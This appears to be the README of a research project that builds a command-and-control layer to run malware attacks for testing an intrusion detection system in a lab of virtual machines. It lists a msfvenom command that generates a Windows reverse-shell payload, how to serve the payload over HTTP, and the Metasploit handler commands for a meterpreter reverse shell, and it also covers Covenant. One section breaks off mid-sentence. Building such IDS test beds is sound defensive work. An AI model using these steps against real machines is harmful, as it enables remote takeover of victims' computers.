# C2abstraction
C2 abstraction layer that provides high level diverse malware attacks to test IDS. 

Important Notes: Updated 11-07-2023

The important pyton files are 'C2Abstraction' and 'Mouse Script'

Virtual Machines:
Attacker - Kali Linux (each IP is different => Must change line 64 in setup)
Victim - Another virtual machine (in this case using Windows)

Preliminary work:
    - Setting up Kali Linux (on VMWare, an alternative is on Oracle VM): https://www.youtube.com/watch?v=pwYH0NNWWzU
    - Setting up victim machine: https://www.youtube.com/watch?v=nvdnQX9UkMY&t=259s

METASPLOIT:
    How to create a payload?
        - If you are creating a payload for testing directly from terminal
          run command 'msfvenom -p windows/shell/reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f exe > ~/Desktop/ShellCodes/payload.exe'
          NOTE: this command assumes that you have a folder called 'ShellCodes' (can be removed)

    How to deploy the payload? (Need to automate this step)
        - As of right now, you can create a server to host the payload by
          right clicking on the folder and choose 'open terminal here' then
          use the command 'python3 -m http.server'

        - How to access this sever on the victim machine?
            * Open a webserver and type in 'http://{ip of kali machine}:{port number}'
            * In this case it is 'http://192.168.239.128:8000 (8000 is the default port)

    How to run msfvenom?
        - run 'msfconsole' in command line
        - then type in 'use exploit/multi/handler'
        - then set payload as 'set payload windows/meterpreter/reverse_tcp'
        - set host using 'set lhost {attacker ip}'
        - set listening port using 'set lport {target_port}'
        - then type in 'exploit'
        NOTE: in the code this whole sequence is chained into one line on line 46: 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {target_ip}; set lport {target_port}; exploit;


How to track if HTTP commands/connections are going through?
    -You can catch the logs of the HTTP connections in real time by
        * going to /etc
        * then go to /ssh
        * then use 'nano' command to edit the 'sshd_config' file
        * look for the line '#LogLevel INFO'
        * remove the # then replace INFO with 'VERBOSE'
        * now run 'sudo journalctl -f' in the command line to track the logs

How to run the payload on the victim machine?
    - Using SCP we can connect to


COVENANT:
NOTE: What is the difference between covenant and metasploit?
        - Covenant has a web GUI that requires a script to control the mouse to deploy the malware

How to download covenant/introduction to covenant: https://www.youtube.com/watch?v=BLMW0fougFM
How to use the interface: https://www.youtube.com/watch?v=iX_qsbbNk2w

Mouse Script:
    - This python file is used to automatically control your mouse to create a listener on the GUI
      and create the "grunt" (used for collecting information)




# Citation
    @Unpublished{HungVu_IDS_TESTING_C2,
      author = {Hung Anh Vu},
      title = {{Research Testing Environment}},
      url = {https://github.com/HungAnhVu/C2abstraction},
      version = {1.0.0},
      year = {2023}
    }
